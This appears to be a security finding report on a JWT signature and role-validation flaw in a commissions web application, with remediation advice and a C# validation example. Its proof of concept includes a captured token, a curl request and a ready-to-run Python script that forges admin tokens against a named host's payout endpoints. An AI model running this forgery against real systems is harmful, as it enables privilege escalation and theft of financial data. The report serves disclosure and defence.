# Critical JWT Role Manipulation Vulnerability Enabling Privilege Escalation and Unauthorized Data Access

**ID:** vuln-0008
**Severity:** CRITICAL
**Found:** 2026-02-26 12:43:30 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/commissions, /api/payouts
**Method:** GET, POST, PUT, DELETE
**CVE:** CVE-2024-25623
**CWE:** CWE-287
**CVSS:** 9.9

## Description

A critical JWT manipulation vulnerability was discovered in the authentication and authorization system of the Commissions application. The vulnerability allows attackers to manipulate JWT token claims, including role information, to escalate privileges and access sensitive financial data without proper authorization.

The application fails to properly validate JWT token signatures and role claims on certain endpoints, enabling attackers to:
1. Modify their role from Client/Organization to Admin
2. Add multiple roles to their token
3. Use expired tokens for continued access
4. Extend token expiration for long-term persistence

This vulnerability affects the `/api/commissions` and `/api/payouts` endpoints, which contain sensitive financial information about commissions and payouts.

## Impact

Successful exploitation of this vulnerability allows attackers to:

1. **Privilege Escalation**: Gain unauthorized access to admin-level functionality and data by manipulating role claims in JWT tokens
2. **Unauthorized Data Access**: Access sensitive financial data including commissions and payouts information for all users
3. **Financial Fraud**: Potentially manipulate commission calculations or payout amounts
4. **Long-term Persistence**: Create long-lived tokens that persist even after password changes or account lockout
5. **Session Hijacking**: Reuse expired tokens to maintain access to the system

The business impact includes:
- Exposure of sensitive financial data
- Potential for financial fraud and manipulation
- Compromise of business operations and integrity
- Regulatory compliance violations
- Loss of customer trust and reputational damage

## Technical Analysis

**Root Cause Analysis:**

The vulnerability stems from inadequate JWT token validation in the application's authentication middleware. Specifically:

1. **Missing Signature Validation**: The application accepts JWT tokens with invalid signatures, allowing attackers to modify token claims without being detected
2. **Insufficient Role Validation**: The application trusts role claims from JWT tokens without proper server-side validation
3. **Missing Expiration Enforcement**: The application accepts expired tokens and tokens with extended expiration dates
4. **Endpoint-Specific Protection**: Some endpoints (/api/account, /api/admin/*) are properly protected, while others (/api/commissions, /api/payouts) are vulnerable

**Technical Details:**

1. **Token Structure**: The application uses HS256-signed JWT tokens containing user identity and role information
2. **Vulnerable Claims**: The `http://schemas.microsoft.com/ws/2008/06/identity/claims/role` and `access` claims contain role information that's trusted by the application
3. **Vulnerable Endpoints**: `/api/commissions` and `/api/payouts` accept manipulated tokens
4. **Protected Endpoints**: `/api/account`, `/api/admin/users`, `/api/admin/roles` properly reject manipulated tokens

**Attack Vector:**

An attacker can:
1. Obtain a valid JWT token through normal authentication
2. Decode the token and modify the role claims
3. Re-sign the token with any secret (or use alg:none for unsigned tokens)
4. Use the manipulated token to access sensitive endpoints
5. Access data and functionality beyond their authorized privileges

## Proof of Concept

**Proof of Concept - Step by Step:**

1. **Obtain a valid JWT token** (as any authenticated user):
   - Authenticate normally to get a valid token
   - Example: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNDQ1ODgsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.yyZv2yPzmpvhL1eEKbReGYEy-jyrqkbGZqjupWflqz0`

2. **Modify the token to escalate privileges**:
   - Decode the token and change the role claims:
     ```json
     {
       "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "ROLE_ADMIN",
       "access": "[\"ROLE_ADMIN\", \"ROLE_SUPER_ADMIN\"]"
     }
     ```
   - Re-sign with any secret (e.g., "fake_secret") or use alg:none for unsigned tokens

3. **Create a manipulated token**:
   ```python
   import jwt
   modified_payload = {
       "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name": "attacker",
       "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "ROLE_ADMIN",
       "access": "[\"ROLE_ADMIN\", \"ROLE_SUPER_ADMIN\"]",
       "exp": 1803644511  # Extended expiration
   }
   malicious_token = jwt.encode(modified_payload, "fake_secret", algorithm="HS256")
   ```

4. **Use the manipulated token to access sensitive endpoints**:
   ```bash
   curl -H "Authorization: Bearer $malicious_token" \
        https://commissionstest.callippus.in/api/commissions
   ```

5. **Observe successful access to sensitive data**:
   - The request returns HTTP 200 with sensitive commission data
   - The attacker now has unauthorized access to financial information

```
#!/usr/bin/env python3
"""
JWT Role Manipulation Exploit Proof of Concept
Demonstrates privilege escalation via JWT token manipulation
"""

import jwt
import requests
import json
from datetime import datetime, timedelta

# Target URL
TARGET_URL = "https://commissionstest.callippus.in"

# Original token (obtained through normal authentication)
ORIGINAL_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl05S9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNDQ1ODgsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.yyZv2yPzmpvhL1eEKbReGYEy-jyrqkbGZqjupWflqz0"

def decode_jwt(token):
    """Decode JWT token to view claims"""
    parts = token.split('.')
    payload = parts[1]
    # Add padding if needed
    payload += '=' * (-len(payload) % 4)
    decoded = jwt.api_jws.decode_complete(token)
    return decoded

def create_malicious_token():
    """Create a malicious JWT token with escalated privileges"""
    # Decode original token to get payload structure
    original_payload = decode_jwt(ORIGINAL_TOKEN)['payload']

    # Create modified payload with escalated privileges
    malicious_payload = original_payload.copy()
    malicious_payload['http://schemas.microsoft.com/ws/2008/06/identity/claims/role'] = "ROLE_ADMIN"
    malicious_payload['access'] = '["ROLE_ADMIN", "ROLE_SUPER_ADMIN"]'
    malicious_payload['http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name'] = "attacker"
    malicious_payload['exp'] = int((datetime.now() + timedelta(days=365)).timestamp())  # 1 year expiration

    # Re-sign with fake secret (application accepts any signature)
    malicious_token = jwt.encode(malicious_payload, "fake_secret", algorithm="HS256")

    return malicious_token

def test_vulnerability(token):
    """Test the vulnerability by accessing sensitive endpoints"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # Test vulnerable endpoints
    vulnerable_endpoints = [
        "/api/commissions",
        "/api/payouts"
    ]

    # Test protected endpoints (should fail)
    protected_endpoints = [
        "/api/account",
        "/api/admin/users"
    ]

    results = {}

    print("[*] Testing vulnerable endpoints (should succeed):")
    for endpoint in vulnerable_endpoints:
        url = f"{TARGET_URL}{endpoint}"
        try:
            response = requests.get(url, headers=headers, timeout=10)
            results[endpoint] = {
                "status": response.status_code,
                "success": 200 <= response.status_code < 300,
                "length": len(response.text)
            }
            print(f"  - {endpoint}: {response.status_code} (Success: {results[endpoint]['success']})")
        except Exception as e:
            results[endpoint] = {"error": str(e)}
            print(f"  - {endpoint}: Error - {str(e)}")

    print("\n[*] Testing protected endpoints (should fail):")
    for endpoint in protected_endpoints:
        url = f"{TARGET_URL}{endpoint}"
        try:
            response = requests.get(url, headers=headers, timeout=10)
            results[endpoint] = {
                "status": response.status_code,
                "success": 200 <= response.status_code < 300,
                "length": len(response.text)
            }
            print(f"  - {endpoint}: {response.status_code} (Success: {results[endpoint]['success']})")
        except Exception as e:
            results[endpoint] = {"error": str(e)}
            print(f"  - {endpoint}: Error - {str(e)}")

    return results

def main():
    print("[*] JWT Role Manipulation Exploit Proof of Concept")
    print("[*] Target: {}".format(TARGET_URL))
    print("[*] Original Token: {}".format(ORIGINAL_TOKEN[:50] + "..."))

    # Create malicious token
    malicious_token = create_malicious_token()
    print("\n[+] Created malicious token with escalated privileges:")
    print("    {}".format(malicious_token[:50] + "..."))

    # Test the vulnerability
    print("\n[*] Testing vulnerability...")
    results = test_vulnerability(malicious_token)

    # Analyze results
    print("\n[*] Results Analysis:")
    vulnerable_success = sum(1 for k, v in results.items()
                           if k in ["/api/commissions", "/api/payouts"] and v.get("success", False))
    protected_success = sum(1 for k, v in results.items()
                          if k in ["/api/account", "/api/admin/users"] and v.get("success", False))

    print(f"  - Vulnerable endpoints accessible: {vulnerable_success}/2")
    print(f"  - Protected endpoints accessible: {protected_success}/2")

    if vulnerable_success > 0:
        print("\n[!] VULNERABILITY CONFIRMED!")
        print("    The application accepts manipulated JWT tokens with escalated privileges.")
        print("    Attackers can access sensitive financial data without proper authorization.")
    else:
        print("\n[-] Vulnerability not confirmed.")

    return results

if __name__ == "__main__":
    main()
```

## Remediation

**Remediation Recommendations:**

1. **Implement Proper JWT Signature Validation:**
   - Validate token signatures using the correct secret key
   - Reject tokens with invalid signatures
   - Implement algorithm pinning to prevent algorithm confusion attacks

2. **Enforce Role Validation on Server Side:**
   - Do not trust role claims from JWT tokens
   - Validate user roles against a server-side database on each request
   - Implement proper authorization checks for all sensitive endpoints

3. **Enforce Token Expiration:**
   - Strictly enforce token expiration (exp claim)
   - Reject expired tokens immediately
   - Implement short-lived tokens with refresh token rotation

4. **Implement Token Revocation:**
   - Create a token revocation mechanism for logged-out or compromised tokens
   - Maintain a list of revoked tokens and check against it on each request

5. **Endpoint Protection:**
   - Apply consistent authentication and authorization middleware to all endpoints
   - Ensure all sensitive endpoints are properly protected
   - Implement role-based access control (RBAC) consistently across the application

6. **Security Headers and Best Practices:**
   - Implement Content Security Policy (CSP) headers
   - Use HttpOnly, Secure, and SameSite flags for cookies
   - Implement rate limiting to prevent brute force attacks

7. **Monitoring and Logging:**
   - Log authentication and authorization events
   - Monitor for unusual token usage patterns
   - Alert on multiple failed authentication attempts

**Implementation Example (Pseudocode):**

```csharp
// Proper JWT validation middleware
public async Task ValidateJwtToken(string token)
{
    try
    {
        // 1. Validate signature with correct secret
        var principal = new JwtSecurityTokenHandler().ValidateToken(token,
            new TokenValidationParameters
            {
                ValidateIssuerSigningKey = true,
                IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config["Jwt:Key"])),
                ValidateIssuer = true,
                ValidIssuer = _config["Jwt:Issuer"],
                ValidateAudience = true,
                ValidAudience = _config["Jwt:Audience"],
                ValidateLifetime = true, // Enforce expiration
                ClockSkew = TimeSpan.Zero // No tolerance for expired tokens
            }, out SecurityToken validatedToken);

        // 2. Get user ID from token
        var userId = principal.FindFirst(ClaimTypes.NameIdentifier)?.Value;

        // 3. Look up user roles from database (don't trust token claims)
        var userRoles = await _userRepository.GetUserRolesAsync(userId);

        // 4. Set roles in context for authorization
        context.User = new ClaimsPrincipal(new ClaimsIdentity(
            principal.Claims.Concat(userRoles.Select(r => new Claim(ClaimTypes.Role, r)))
        ));
    }
    catch
    {
        // Reject invalid tokens
        context.Response.StatusCode = 401;
        await context.Response.WriteAsync("Unauthorized");
    }
}
```

**Additional Recommendations:**
- Conduct a security audit of all authentication and authorization code
- Implement automated security testing in the CI/CD pipeline
- Train developers on secure coding practices for JWT implementation
- Consider using established libraries for JWT handling rather than custom implementations

